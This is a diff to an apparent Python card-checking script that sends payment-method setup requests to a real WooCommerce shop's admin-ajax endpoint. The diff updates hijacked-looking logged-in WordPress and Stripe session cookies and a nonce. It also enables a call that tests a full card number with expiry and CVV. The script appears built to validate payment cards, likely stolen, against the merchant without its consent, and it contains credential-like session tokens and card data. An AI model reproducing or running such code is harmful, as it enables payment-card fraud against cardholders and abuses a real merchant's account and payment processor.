@@ -57,17 +57,16 @@ def au(ccx):
     cookies = {
     'wordpress_sec_770c706eea1236171dc55a3d679b65cf': 'ficada8620%7C1759938679%7CWnQYpRLAKr2NqG8o0ZFxX8mxx7l4BNxMMAIL6gA22AF%7C0f6b0d25ac8c58000d98327ce6d7f34d2499c1fe8cc952dbff79c97df4a9c23a',
     '__stripe_mid': '06d318d0-c3a6-413d-94b6-4e891be1aa7b8c7f84',
+    'wordpress_logged_in_770c706eea1236171dc55a3d679b65cf': 'ficada8620%7C1759938679%7CWnQYpRLAKr2NqG8o0ZFxX8mxx7l4BNxMMAIL6gA22AF%7Cdad3d97bdf9a1a2ea2c1b4ce3fca86d8aee044b3bb5245efc3288b6793fb92bd',
+    'mcfw-wp-user-cookie': 'NzI3fDB8NjN8Njc4XzFhOTZhNWIwZTRjMTVjYjcwZTQzZWYzN2ZlYzllYjA3M2M1MTUwZTYwNDI4N2VlNzUwMDZkMzU2MjkzYTRhZDg%3D',
     'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2025-09-24%2015%3A19%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fjohnnysbackyard.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fjohnnysbackyard.co.uk%2Fmy-account%2Fpayment-methods%2F',
-    'sbjs_first_add': 'fd%3D2025-09-24%2015%3A19%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fjohnnysbackyard.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fjohnnysbackyard.co.uk%2Fmy-account%2Fpayment-methods%2F',
+    'sbjs_current_add': 'fd%3D2025-09-25%2003%3A04%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Fjohnnysbackyard.co.uk%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_first_add': 'fd%3D2025-09-25%2003%3A04%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Fjohnnysbackyard.co.uk%2F%7C%7C%7Crf%3D%28none%29',
     'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36',
-    'PHPSESSID': 'vms1gakr1pdoqv7g1ahk07skel',
-    'wordpress_logged_in_770c706eea1236171dc55a3d679b65cf': 'ficada8620%7C1759938679%7CWnQYpRLAKr2NqG8o0ZFxX8mxx7l4BNxMMAIL6gA22AF%7Cdad3d97bdf9a1a2ea2c1b4ce3fca86d8aee044b3bb5245efc3288b6793fb92bd',
-    'mcfw-wp-user-cookie': 'NzI3fDB8NjN8Njc4XzFhOTZhNWIwZTRjMTVjYjcwZTQzZWYzN2ZlYzllYjA3M2M1MTUwZTYwNDI4N2VlNzUwMDZkMzU2MjkzYTRhZDg%3D',
-    'sbjs_session': 'pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fjohnnysbackyard.co.uk%2Fmy-account%2Fadd-payment-method%2F',
-    '__stripe_sid': '7f45f0f8-665a-4432-8f0d-96e3b70c378db19f46',
+    'sbjs_session': 'pgs%3D10%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fjohnnysbackyard.co.uk%2Fmy-account%2Fadd-payment-method%2F',
+    '__stripe_sid': '2b65d9d9-fcea-46ce-966d-16d92d60f63b37bd24',
 }
 
     headers = {
@@ -88,7 +87,7 @@ def au(ccx):
     files = {
     'action': (None, 'create_setup_intent'),
     'wcpay-payment-method': (None, id),
-    '_ajax_nonce': (None, '546d9fbe77'),
+    '_ajax_nonce': (None, 'a4e67c4c00'),
 }
 
     response = requests.post('https://johnnysbackyard.co.uk/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, files=files)        
@@ -116,4 +115,4 @@ def au(ccx):
     
             
         
-#print(au("4895040585291392|10|27|511"))              
+print(au("4895040585291392|10|27|511"))              
